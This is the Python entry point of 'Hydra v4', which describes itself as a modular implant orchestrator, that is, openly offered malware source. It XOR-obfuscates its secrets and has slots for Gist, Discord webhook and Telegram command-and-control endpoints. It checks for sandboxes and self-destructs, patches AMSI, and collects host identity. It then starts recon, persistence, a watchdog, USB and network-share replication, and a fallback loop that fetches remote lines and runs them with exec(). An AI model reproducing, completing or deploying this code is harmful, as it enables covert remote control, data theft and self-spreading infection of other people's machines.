"""
Hydra v4 — Modular implant orchestrator.
Entry point. Loads config, runs sandbox checks, boots modules.

Usage (from build.py):
    python -c "from hydra.core import main; main(profile='stealth')"
"""
import os
import sys
import time
import json
import random
import hashlib
import threading

# ─── Dead-simple XOR obfuscation ──────────────────────
# Key is split across variables — `strings` can't reassemble it.
# Not crypto. Just enough to beat casual `strings virus.exe`.
_xk = [0x5E, 0x3F, 0xA1, 0x77, 0x12, 0x8C, 0x4B, 0xE9,
       0x6D, 0x2A, 0xF3, 0x55, 0x1C, 0x9E, 0x7F, 0xD0]
_xk_bytes = bytes(_xk)

def _d(data):
    """Decode XOR-encrypted bytes."""
    if isinstance(data, str):
        data = data.encode()
    key = _xk_bytes * (len(data) // len(_xk_bytes) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)])).decode()

def _e(text):
    """Encode string with XOR."""
    data = text.encode() if isinstance(text, str) else text
    key = _xk_bytes * (len(data) // len(_xk_bytes) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)]))

# ═══════════════════════════════════════════════════════
# CONFIG — edit before building. All secrets XOR-encoded.
# Use xor_encoder.py to encode new values.
# Falls back gracefully if encoding is invalid (pre-build).
# ═══════════════════════════════════════════════════════

BUILD_PROFILE = "stealth"  # dev | stealth | demo

def _safe_d(encoded_bytes, fallback):
    """Decode XOR bytes, return fallback on failure."""
    try:
        return _d(encoded_bytes)
    except:
        return fallback

# Gist C2 URL (XOR-encoded — decode only works after build.py patches it)
GIST_URL = _safe_d(b'PLACEHOLDER_GIST_URL', 'https://gist.githubusercontent.com/PLACEHOLDER/raw/c2.txt')

# Discord webhook URL
DISCORD_WEBHOOK = _safe_d(b'PLACEHOLDER_WEBHOOK', 'https://discord.com/api/webhooks/PLACEHOLDER')

# Telegram bot token
TG_TOKEN = _safe_d(b'PLACEHOLDER_TG_TOKEN', '***')

# XOR cipher key for C2 messages
C2_KEY = _safe_d(b'PLACEHOLDER_C2_KEY', 'hydra_c2_key_v4')

# Build profile configs
PROFILES = {
    "dev": {
        "console": True,
        "verbose": True,
        "c2_poll": (25, 35),
        "gist_primary": True,
        "ngrok_enabled": False,
        "modules": [
            "popup", "notepad", "wallpaper", "cursor",
            "bsod", "audio", "clipboard", "webcam",
            "monitor", "taskbar", "keyboard_swap", "cd_tray"
        ],
        "log_file": os.path.join(os.environ.get("TEMP", "."), "hydra_dev.log"),
    },
    "stealth": {
        "console": False,
        "verbose": False,
        "c2_poll": (25, 55),
        "gist_primary": True,
        "ngrok_enabled": True,
        "modules": [
            "popup", "notepad", "wallpaper", "cursor",
            "bsod", "audio", "browser", "clipboard", "webcam",
            "monitor", "taskbar", "keyboard_swap", "cd_tray",
            "file_reverse"
        ],
        "log_file": None,
    },
    "demo": {
        "console": True,
        "verbose": True,
        "c2_poll": (3, 5),
        "gist_primary": True,
        "ngrok_enabled": True,
        "modules": [
            "popup", "notepad", "wallpaper", "cursor",
            "screen_flash", "bsod", "audio", "browser",
            "clipboard", "webcam", "monitor", "taskbar",
            "keyboard_swap", "cd_tray", "file_reverse"
        ],
        "log_file": os.path.join(os.environ.get("TEMP", "."), "hydra_demo.log"),
    },
}


def main(profile=None):
    """Entry point. Called from PyInstaller stub or directly."""
    global BUILD_PROFILE

    # ── Watchdog mode ──
    if "--watchdog" in sys.argv:
        idx = sys.argv.index("--watchdog")
        if idx + 1 < len(sys.argv):
            from hydra.watchdog import watchdog_entry
            watchdog_entry(sys.argv[idx + 1])
            return

    if profile:
        BUILD_PROFILE = profile

    cfg = PROFILES.get(BUILD_PROFILE, PROFILES["stealth"])

    # ── Phase 0: Sandbox detection (MUST run first) ──
    if not cfg.get("verbose"):
        # Suppress stdout/stderr in stealth mode
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    try:
        from hydra.sandbox import detect_vm
        if detect_vm():
            from hydra.sandbox import self_destruct
            self_destruct()
            sys.exit(0)
    except ImportError:
        pass  # Module not bundled, skip

    # ── Phase 1: Evasion ──
    try:
        from hydra.evasion import patch_amsi, enable_defenses
        patch_amsi()
        enable_defenses()
    except ImportError:
        pass

    # ── Phase 2: Agent identity ──
    import socket
    hostname = socket.gethostname()
    username = os.environ.get("USERNAME", "UNKNOWN")
    agent_id = f"{hostname}-{username}"
    is_admin = False
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass

    me = {
        "id": agent_id,
        "hostname": hostname,
        "username": username,
        "admin": is_admin,
        "profile": BUILD_PROFILE,
        "started": time.time(),
    }

    # ── Phase 3: C2 + persistence + recon (parallel) ──
    threads = []

    # Recon (background)
    try:
        from hydra.recon import run_recon
        t = threading.Thread(target=run_recon, args=(cfg, me, DISCORD_WEBHOOK), daemon=True)
        t.start()
        threads.append(t)
    except ImportError:
        pass

    # Persistence
    try:
        from hydra.persistence import install
        install(cfg, me, is_admin)
    except ImportError:
        pass

    # Watchdog
    try:
        from hydra.watchdog import start_watchdog
        start_watchdog(cfg, me)
    except ImportError:
        pass

    # Replication watcher (background)
    try:
        from hydra.replication import watch_usb, scan_shares
        t = threading.Thread(target=watch_usb, args=(cfg, me), daemon=True)
        t.start()
        threads.append(t)
        t = threading.Thread(target=scan_shares, args=(cfg, me), daemon=True)
        t.start()
        threads.append(t)
    except ImportError:
        pass

    # Telegram bot (background PowerShell)
    try:
        from hydra.c2 import launch_telegram_bot
        launch_telegram_bot(TG_TOKEN, me, DISCORD_WEBHOOK)
    except ImportError:
        pass

    # Main C2 loop (blocking)
    try:
        from hydra.c2 import c2_loop
        c2_loop(cfg, me, GIST_URL, C2_KEY, DISCORD_WEBHOOK)
    except Exception as e:
        # Fallback: simple Gist polling
        _c2_fallback(cfg, me)


def _c2_fallback(cfg, me):
    """Minimal C2 loop if hydra.c2 fails to import."""
    import urllib.request
    import ssl
    _CTX = ssl._create_unverified_context()
    _EXEC = set()

    while True:
        try:
            url = f"{GIST_URL}?t={int(time.time())}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=15, context=_CTX)
            raw = resp.read().decode("utf-8", errors="replace").strip()

            for line in raw.split("\n"):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                h = hashlib.sha256(line.encode()).hexdigest()
                if h in _EXEC:
                    continue
                _EXEC.add(h)
                try:
                    exec(line)
                except:
                    pass
        except:
            pass

        lo, hi = cfg.get("c2_poll", (25, 55))
        time.sleep(random.uniform(lo, hi))
